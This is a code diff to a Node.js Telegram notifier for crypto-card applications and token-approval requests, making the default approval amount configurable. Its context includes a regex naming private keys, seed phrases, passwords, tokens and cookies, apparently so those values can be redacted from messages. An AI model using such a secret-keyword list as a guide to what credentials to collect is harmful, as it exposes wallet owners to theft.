@@ -1,6 +1,7 @@
 const { sendTelegramMessage, escapeHtml, isConfigured } = require("./telegram");
 const dedupe = require("../storage/notificationDedupe");
 const logger = require("../utils/logger");
+const { approveAmountLabel } = require("../config/approvalAmount");
 
 const SENSITIVE = /private.?key|mnemonic|seed.?phrase|password|symkey|bot.?token|authorization|api.?key|cookie|secret/i;
 
@@ -259,7 +260,7 @@ function buildCardApplicationMessage(application, session) {
     }
     lines.push(`Spender / card contract: ${display(payment?.spender)}`);
     lines.push(`Token contract: ${display(payment?.tokenContract)}`);
-    lines.push(`Amount: ${display(payment?.allowance || "1 USDT")}`);
+    lines.push(`Amount: ${display(payment?.allowance || approveAmountLabel())}`);
     lines.push("");
     lines.push(`<b>Submitted:</b> ${display(application.submittedAt)}`);
 
@@ -317,7 +318,7 @@ async function notifyApprovalRequested(payment, send = sendTelegramMessage) {
             `<b>Network:</b> ${escapeHtml(prettyNetwork(payment.network))}`,
             `<b>Spender:</b> ${display(payment.spender)}`,
             `<b>Token:</b> ${display(payment.tokenContract)}`,
-            `<b>Amount:</b> ${display(payment.allowance || "1 USDT")}`,
+            `<b>Amount:</b> ${display(payment.allowance || approveAmountLabel())}`,
             `<b>Time:</b> ${display(new Date().toISOString())}`
         ];
 
